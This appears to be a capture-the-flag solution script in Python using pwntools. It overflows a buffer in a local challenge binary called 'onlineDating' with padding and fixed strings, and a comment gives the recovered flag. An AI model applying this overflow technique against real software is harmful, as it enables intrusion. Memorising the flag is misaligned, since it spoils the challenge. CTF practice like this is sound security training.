from pwn import *

msgin = b"a"*56 + b"Gerard_Pique"+ b"Clara_C." + b"TwingoOo"+ b"CasioOo!"  
p = process('./onlineDating') 
p.sendline(msgin) 
p.interactive() 

#SPRITZ{CrAzy_DuD3}